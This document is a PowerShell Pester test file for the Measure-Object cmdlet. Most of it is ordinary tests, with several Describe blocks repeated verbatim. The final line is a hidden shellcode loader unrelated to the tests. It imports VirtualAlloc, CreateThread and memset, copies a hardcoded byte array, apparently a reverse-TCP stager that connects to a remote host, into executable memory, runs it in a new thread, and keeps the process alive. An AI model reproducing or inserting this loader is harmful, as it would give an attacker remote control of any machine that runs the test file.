

Describe "Measure-Object" -Tags "CI" {
    BeforeAll {
        $testObject = 1,3,4
        $testObject2 = 1..100
    }

    It "Should be able to be called without error" {
        { Measure-Object | Out-Null } | Should -Not -Throw
    }

    It "Should be able to call on piped input" {
        { $testObject | Measure-Object } | Should -Not -Throw
    }

    It "Should be able to count the number of objects input to it" {
        $($testObject | Measure-Object).Count | Should -Be $testObject.Length
    }

    It "Should calculate Standard Deviation" {
        $actual = ($testObject | Measure-Object -StandardDeviation)
        
        
        
        [Math]::abs($actual.StandardDeviation - 1.52752523165195) | Should -BeLessThan .00000000000001
    }


    It "Should calculate Standard Deviation" {
        $actual = ($testObject2 | Measure-Object -StandardDeviation)
        
        
        
        [Math]::abs($actual.StandardDeviation - 29.011491975882) | Should -BeLessThan .0000000000001
    }

    It "Should calculate Standard Deviation with -Sum" {
        $actual = ($testObject | Measure-Object -Sum -StandardDeviation)
        
        $actual.Sum | Should Be 8
        
        
        [Math]::abs($actual.StandardDeviation - 1.52752523165195) | Should -BeLessThan .00000000000001
    }

    It "Should calculate Standard Deviation with -Average" {
        $actual = ($testObject | Measure-Object -Average -StandardDeviation)
        
        [Math]::abs($actual.Average - 2.66666666666667) | Should -BeLessThan .00000000000001
        
        
        [Math]::abs($actual.StandardDeviation - 1.52752523165195) | Should -BeLessThan .00000000000001
    }

    It "Should calculate Standard Deviation with -Sum -Average" {
        $actual = ($testObject2 | Measure-Object -Sum -Average -StandardDeviation)
        
        $actual.Sum | Should Be 5050
        $actual.Average | Should Be 50.5
        
        
        [Math]::abs($actual.StandardDeviation - 29.011491975882) | Should -BeLessThan .0000000000001
    }

    It "Should be able to count using the Property switch" {
        $expected = $(Get-ChildItem $TestDrive).Length
        $actual   = $(Get-ChildItem $TestDrive | Measure-Object -Property Length).Count

        $actual | Should -Be $expected
    }

    It "Should be able to use wildcards for the Property argument" {
        $data = [pscustomobject]@{ A1 = 1; A2 = 2; C3 = 3 },
                [pscustomobject]@{ A1 = 1; A2 = 2; A3 = 3 }
        $actual = $data | Measure-Object -Property A* -Sum
        $actual.Count       | Should -Be 3
        $actual[0].Property | Should -Be A1
        $actual[0].Sum      | Should -Be 2
        $actual[0].Count    | Should -Be 2
        $actual[1].Property | Should -Be A2
        $actual[1].Sum      | Should -Be 4
        $actual[1].Count    | Should -Be 2
        $actual[2].Property | Should -Be A3
        $actual[2].Sum      | Should -Be 3
        $actual[2].Count    | Should -Be 1
    }

    Context "Numeric tests" {
        It "Should be able to sum" {
            $actual   = $testObject | Measure-Object -Sum
            $expected = 0

            foreach ( $obj in $testObject )
            {
                $expected += $obj
            }

            $actual.Sum | Should -Be $expected
        }

        It "Should be able to average" {
            $actual   = $testObject | Measure-Object -Average
            $expected = 0

            foreach ( $obj in $testObject )
            {
                $expected += $obj
            }

            $expected /= $testObject.length

            $actual.Average | Should -Be $expected
        }

        It "Should be able to return a minimum" {
            $actual   = $testObject | Measure-Object -Minimum
            $expected = $testObject[0]

            for ($i=0; $i -lt $testObject.length; $i++)
            {
                if ( $testObject[$i] -lt $expected )
                {
                    $expected = $testObject[$i]
                }
            }

            $actual.Minimum | Should -Be $expected
        }

        It "Should be able to return a minimum when multiple objects are the minimum" {
            $testMinimum = 1,1,2,4
            $actual      = $testMinimum | Measure-Object -Minimum
            $expected    = $testMinimum[0]

            for ($i=1; $i -lt $testMinimum.length; $i++)
            {
                if ( $testMinimum[$i] -lt $expected )
                {
                    $expected = $testMinimum[$i]
                }
            }

            $actual.Minimum | Should -Be $expected
        }

        It "Should be able to return a maximum" {
            $actual   = $testObject | Measure-Object -Maximum
            $expected = $testObject[0]

            for ($i=1; $i -lt $testObject.length; $i++)
            {
                if ( $testObject[$i] -gt $expected )
                {
                    $expected = $testObject[$i]
                }
            }

            $actual.Maximum | Should -Be $expected
        }

        It "Should be able to return a maximum when multiple objects are the maximum" {
            $testMaximum = 1,3,5,5
            $actual      = $testMaximum | Measure-Object -Maximum
            $expected    = $testMaximum[0]

            for ($i=1; $i -lt $testMaximum.length; $i++)
            {
                if ( $testMaximum[$i] -gt $expected )
                {
                    $expected = $testMaximum[$i]
                }
            }

            $actual.Maximum | Should -Be $expected
        }

        It "Should be able to return all the statitics for given values" {
            $result = 1..10  | Measure-Object -AllStats
            $result.Count    | Should -Be 10
            $result.Average  | Should -Be 5.5
            $result.Sum      | Should -Be 55
            $result.Minimum  | Should -Be 1
            $result.Maximum  | Should -Be 10
            ($result.StandardDeviation).ToString()  | Should -Be '3.0276503540974917'
        }
    }

    Context "String tests" {
        BeforeAll {
            $nl = [Environment]::NewLine
            $testString = "HAD I the heavens' embroidered cloths,$nl Enwrought with golden and silver light,$nl The blue and the dim and the dark cloths$nl Of night and light and the half light,$nl I would spread the cloths under your feet:$nl But I, being poor, have only my dreams;$nl I have spread my dreams under your feet;$nl Tread softly because you tread on my dreams."
        }

        It "Should be able to count the number of words in a string" {
            $expectedLength = $testString.Replace($nl,"").Split().length
            $actualLength   = $testString | Measure-Object -Word

            $actualLength.Words | Should -Be $expectedLength
        }

        It "Should be able to count the number of characters in a string" {
            $expectedLength = $testString.length
            $actualLength   = $testString | Measure-Object -Character

            $actualLength.Characters | Should -Be $expectedLength
        }

        It "Should be able to count the number of lines in a string" {
            $expectedLength = $testString.Split($nl, [System.StringSplitOptions]::RemoveEmptyEntries).length
            $actualLength   = $testString | Measure-Object -Line

            $actualLength.Lines | Should -Be $expectedLength
        }
    }
}

Describe "Measure-Object DRT basic functionality" -Tags "CI" {
    BeforeAll {
        if(-not ([System.Management.Automation.PSTypeName]'TestMeasureGeneric').Type)
        {
            Add-Type -TypeDefinition @"
    [System.Flags]
    public enum TestMeasureGeneric : uint
    {
        TestSum = 1,
        TestAverage = 2,
        TestMax = 4,
        TestMin = 8
    }
"@
        }

        if(-not ([System.Management.Automation.PSTypeName]'TestMeasureText').Type)
        {
            Add-Type -TypeDefinition @"
    [System.Flags]
    public enum TestMeasureText : uint
    {
        TestIgnoreWS = 1,
        TestCharacter = 2,
        TestWord = 4,
        TestLine = 8
    }
"@
        }

        $employees = [pscustomobject]@{"FirstName"="joseph"; "LastName"="smith"; "YearsInMS"=15},
                            [pscustomobject]@{"FirstName"="paul"; "LastName"="smith"; "YearsInMS"=15},
                            [pscustomobject]@{"FirstName"="mary jo"; "LastName"="soe"; "YearsInMS"=5},
                            [pscustomobject]@{"FirstName"="edmund`todd `n"; "LastName"="bush"; "YearsInMS"=9}
    }

    It "Measure-Object with Generic enum value options combination should work"{
        $flags = [TestMeasureGeneric]0
        $property = "FirstName"
        $testSum = ($flags -band [TestMeasureGeneric]::TestSum) -gt 0
        $testAverage = ($flags -band [TestMeasureGeneric]::TestAverage) -gt 0
        $testMax = ($flags -band [TestMeasureGeneric]::TestMax) -gt 0
        $testMin = ($flags -band [TestMeasureGeneric]::TestMin) -gt 0
        $result = $employees | Measure-Object -Sum:$testSum -Average:$testAverage -Max:$testMax -Min:$testMin -Prop $property
        $result.Count   | Should -Be 4
        $result.Sum     | Should -BeNullOrEmpty
        $result.Average | Should -BeNullOrEmpty
        $result.Max     | Should -BeNullOrEmpty
        $result.Min     | Should -BeNullOrEmpty
        for ($i = 1; $i -lt 8 * 2; $i++)
        {
            $flags = [TestMeasureGeneric]$i
            $property = "YearsInMS"
            $testSum = ($flags -band [TestMeasureGeneric]::TestSum) -gt 0
            $testAverage = ($flags -band [TestMeasureGeneric]::TestAverage) -gt 0
            $testMax = ($flags -band [TestMeasureGeneric]::TestMax) -gt 0
            $testMin = ($flags -band [TestMeasureGeneric]::TestMin) -gt 0
            $result = $employees | Measure-Object -Sum:$testSum -Average:$testAverage -Max:$testMax -Min:$testMin -Prop $property
            $result.Count | Should -Be 4
            if($testSum)
            {
                $result.Sum | Should -Be 44
            }
            else
            {
                $result.Sum | Should -BeNullOrEmpty
            }

            if($testAverage)
            {
                $result.Average | Should -Be 11
            }
            else
            {
                $result.Average | Should -BeNullOrEmpty
            }

            if($testMax)
            {
                $result.Maximum | Should -Be 15
            }
            else
            {
                $result.Maximum | Should -BeNullOrEmpty
            }

            if($testMin)
            {
                $result.Minimum | Should -Be 5
            }
            else
            {
                $result.Minimum | Should -BeNullOrEmpty
            }
        }
    }

    It "Measure-Object with Text combination should work"{
        for ($i = 1; $i -lt 8 * 2; $i++)
        {
            $flags = [TestMeasureText]$i
            $property = "FirstName"
            $testIgnoreWS = ($flags -band [TestMeasureText]::TestIgnoreWS) -gt 0
            $testCharacter = ($flags -band [TestMeasureText]::TestCharacter) -gt 0
            $testWord = ($flags -band [TestMeasureText]::TestWord) -gt 0
            $testLine = ($flags -band [TestMeasureText]::TestLine) -gt 0
            $result = $employees | Measure-Object -IgnoreWhiteSpace:$testIgnoreWS -Character:$testCharacter -Word:$testWord -Line:$testLine -Prop $property

            if($testCharacter)
            {
                if($testIgnoreWS)
                {
                    $result.Characters | Should -Be 25
                }
                else
                {
                    $result.Characters | Should -Be 29
                }
            }
            else
            {
                $result.Characters | Should -BeNullOrEmpty
            }

            if($testWord)
            {
                $result.Words | Should -Be 6
            }
            else
            {
                $result.Words | Should -BeNullOrEmpty
            }

            if($testLine)
            {
                $result.Lines | Should -Be 4
            }
            else
            {
                $result.Lines | Should -BeNullOrEmpty
            }
        }
    }

    It "Measure-Object with ScriptBlock properties should work" {
        $result = 1..10 | Measure-Object -Sum -Average -Minimum -Maximum -Property {$_ * 10}
        $result.Count    | Should -Be 10
        $result.Average  | Should -Be 55
        $result.Sum      | Should -Be 550
        $result.Minimum  | Should -Be 10
        $result.Maximum  | Should -Be 100
        $result.Property | Should -Be '$_ * 10'
    }

    It "Measure-Object with ScriptBlock properties should work with -word" {
        $result = "a,b,c" | Measure-Object -Word  {$_ -split ','}
        $result.Words | Should -Be 3
    }

    It "Measure-Object ScriptBlock properties should be able to transform input" {
        $map = @{ one = 1; two = 2; three = 3 }
        $result = "one", "two", "three" | Measure-Object -Sum {$map[$_]}
        $result.Sum | Should -Be 6
    }

    It "Measure-Object should handle hashtables as objects" {
        $htables = @{foo = 1}, @{foo = 3}, @{foo = 10}
        $result = $htables | Measure-Object -Sum fo*
        $result.Sum | Should -Be 14
    }

    It "Measure-Object should handle hashtables as objects with ScriptBlock properties" {
        $htables = @{foo = 1}, @{foo = 3}, @{foo = 10}
        $result = $htables | Measure-Object -Sum {$_.foo * 10 }
        $result.Sum | Should -Be 140
    }

    
    
    
    
    function Test-PSPropertyExpression {
        [CmdletBinding()]
        param (
            [Parameter(Mandatory,Position=0)]
            [PSPropertyExpression]
                $pe,
            [Parameter(ValueFromPipeline)]
                $InputObject
        )
        begin { $sum = 0}
        process { $sum += $pe.GetValues($InputObject).result }
        end { $sum }
    }

    It "Test-PropertyExpression function with a wildcard property expression should sum numbers" {
        $result = (1..10).ForEach{@{value = $_}} | Test-PSPropertyExpression val*
        $result | Should -Be 55
    }

    It "Test-PropertyExpression function with a scriptblock property expression should sum numbers" {
        $result = 1..10 | Test-PSPropertyExpression {$_}
        $result | Should -Be 55
    }

    It "Test-PropertyExpression function with a scriptblock property expression should be able to transform input" {
        
        $result = "one", "two", "three", "four", "five" | Test-PSPropertyExpression {($_.ToCharArray() -match 'e').Count}
        $result | Should -Be 4
    }
    It "Measure-Object with multiple lines should work"{
        $result = "123`n4" | Measure-Object -Line
        $result.Lines | Should -Be 2
    }

    It "Measure-Object with ScriptBlock properties should work" {
        $result = 1..10 | Measure-Object -Sum -Average -Minimum -Maximum -Property {$_ * 10}
        $result.Count    | Should -Be 10
        $result.Average  | Should -Be 55
        $result.Sum      | Should -Be 550
        $result.Minimum  | Should -Be 10
        $result.Maximum  | Should -Be 100
        $result.Property | Should -Be '$_ * 10'
    }

    It "Measure-Object with ScriptBlock properties should work with -word" {
        $result = "a,b,c", "d,e" | Measure-Object -Word  {$_ -split ','}
        $result.Words | Should -Be 5
    }

    It "Measure-Object ScriptBlock properties should be able to transform input" {
        $map = @{ one = 1; two = 2; three = 3 }
        $result = "one", "two", "three" | Measure-Object -Sum {$map[$_]}
        $result.Sum | Should -Be 6
    }

    It "Measure-Object should handle hashtables as objects" {
        $htables = @{foo = 1}, @{foo = 3}, @{foo = 10}
        $result = $htables | Measure-Object -Sum fo*
        $result.Sum | Should -Be 14
    }

    It "Measure-Object should handle hashtables as objects with ScriptBlock properties" {
        $htables = @{foo = 1}, @{foo = 3}, @{foo = 10}
        $result = $htables | Measure-Object -Sum {$_.foo * 10 }
        $result.Sum | Should -Be 140
    }
}



Describe "Directly test the PSPropertyExpression type" -Tags "CI" {
    
    
    function Test-PSPropertyExpression {
        [CmdletBinding()]
        param (
            [Parameter(Mandatory,Position=0)]
            [PSPropertyExpression]
                $pe,
            [Parameter(ValueFromPipeline)]
                $InputObject
        )
        begin { $sum = 0}
        process { $sum += $pe.GetValues($InputObject).result }
        end { $sum }
    }

    It "Test-PropertyExpression function with a wildcard property expression should sum numbers" {
        $result = (1..10).ForEach{@{value = $_}} | Test-PSPropertyExpression val*
        $result | Should -Be 55
    }

    It "Test-PropertyExpression function with a scriptblock property expression should sum numbers" {
        $result = 1..10 | Test-PSPropertyExpression {$_}
        $result | Should -Be 55
    }

    It "Test-PropertyExpression function with a scriptblock property expression should be able to transform input" {
        
        $result = "one", "two", "three", "four", "five" | Test-PSPropertyExpression {($_.ToCharArray() -match 'e').Count}
        $result | Should -Be 4
    }

    It "Measure-Object with multiple lines should work"{
        $result = "123`n4" | Measure-Object -Line
        $result.Lines | Should -Be 2
    }

    It "Measure-Object with ScriptBlock properties should work" {
        $result = 1..10 | Measure-Object -Sum -Average -Minimum -Maximum -Property {$_ * 10}
        $result.Count    | Should -Be 10
        $result.Average  | Should -Be 55
        $result.Sum      | Should -Be 550
        $result.Minimum  | Should -Be 10
        $result.Maximum  | Should -Be 100
        $result.Property | Should -Be '$_ * 10'
    }

    It "Measure-Object with ScriptBlock properties should work with -word" {
        $result = "a,b,c", "d,e" | Measure-Object -Word  {$_ -split ','}
        $result.Words | Should -Be 5
    }

    It "Measure-Object ScriptBlock properties should be able to transform input" {
        $map = @{ one = 1; two = 2; three = 3 }
        $result = "one", "two", "three" | Measure-Object -Sum {$map[$_]}
        $result.Sum | Should -Be 6
    }

    It "Measure-Object should handle hashtables as objects" {
        $htables = @{foo = 1}, @{foo = 3}, @{foo = 10}
        $result = $htables | Measure-Object -Sum fo*
        $result.Sum | Should -Be 14
    }

    It "Measure-Object should handle hashtables as objects with ScriptBlock properties" {
        $htables = @{foo = 1}, @{foo = 3}, @{foo = 10}
        $result = $htables | Measure-Object -Sum {$_.foo * 10 }
        $result.Sum | Should -Be 140
    }
}



Describe "Directly test the PSPropertyExpression type" -Tags "CI" {
    
    
    function Test-PSPropertyExpression {
        [CmdletBinding()]
        param (
            [Parameter(Mandatory,Position=0)]
            [PSPropertyExpression]
                $pe,
            [Parameter(ValueFromPipeline)]
                $InputObject
        )
        begin { $sum = 0}
        process { $sum += $pe.GetValues($InputObject).result }
        end { $sum }
    }

    It "Test-PropertyExpression function with a wildcard property expression should sum numbers" {
        $result = (1..10).ForEach{@{value = $_}} | Test-PSPropertyExpression val*
        $result | Should -Be 55
    }

    It "Test-PropertyExpression function with a scriptblock property expression should sum numbers" {
        $result = 1..10 | Test-PSPropertyExpression {$_}
        $result | Should -Be 55
    }

    It "Test-PropertyExpression function with a scriptblock property expression should be able to transform input" {
        
        $result = "one", "two", "three", "four", "five" | Test-PSPropertyExpression {($_.ToCharArray() -match 'e').Count}
        $result | Should -Be 4
    }
    It "Measure-Object with multiple lines should work"{
        $result = "123`n4" | Measure-Object -Line
        $result.Lines | Should -Be 2
    }

    It "Measure-Object with ScriptBlock properties should work" {
        $result = 1..10 | Measure-Object -Sum -Average -Minimum -Maximum -Property {$_ * 10}
        $result.Count    | Should -Be 10
        $result.Average  | Should -Be 55
        $result.Sum      | Should -Be 550
        $result.Minimum  | Should -Be 10
        $result.Maximum  | Should -Be 100
        $result.Property | Should -Be '$_ * 10'
    }

    It "Measure-Object with ScriptBlock properties should work with -word" {
        $result = "a,b,c", "d,e" | Measure-Object -Word  {$_ -split ','}
        $result.Words | Should -Be 5
    }

    It "Measure-Object ScriptBlock properties should be able to transform input" {
        $map = @{ one = 1; two = 2; three = 3 }
        $result = "one", "two", "three" | Measure-Object -Sum {$map[$_]}
        $result.Sum | Should -Be 6
    }

    It "Measure-Object should handle hashtables as objects" {
        $htables = @{foo = 1}, @{foo = 3}, @{foo = 10}
        $result = $htables | Measure-Object -Sum fo*
        $result.Sum | Should -Be 14
    }

    It "Measure-Object should handle hashtables as objects with ScriptBlock properties" {
        $htables = @{foo = 1}, @{foo = 3}, @{foo = 10}
        $result = $htables | Measure-Object -Sum {$_.foo * 10 }
        $result.Sum | Should -Be 140
    }
}



Describe "Directly test the PSPropertyExpression type" -Tags "CI" {
    
    
    function Test-PSPropertyExpression {
        [CmdletBinding()]
        param (
            [Parameter(Mandatory,Position=0)]
            [PSPropertyExpression]
                $pe,
            [Parameter(ValueFromPipeline)]
                $InputObject
        )
        begin { $sum = 0}
        process { $sum += $pe.GetValues($InputObject).result }
        end { $sum }
    }

    It "Test-PropertyExpression function with a wildcard property expression should sum numbers" {
        $result = (1..10).ForEach{@{value = $_}} | Test-PSPropertyExpression val*
        $result | Should -Be 55
    }

    It "Test-PropertyExpression function with a scriptblock property expression should sum numbers" {
        $result = 1..10 | Test-PSPropertyExpression {$_}
        $result | Should -Be 55
    }

    It "Test-PropertyExpression function with a scriptblock property expression should be able to transform input" {
        
        $result = "one", "two", "three", "four", "five" | Test-PSPropertyExpression {($_.ToCharArray() -match 'e').Count}
        $result | Should -Be 4
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x54,0xed,0xdd,0xb2,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

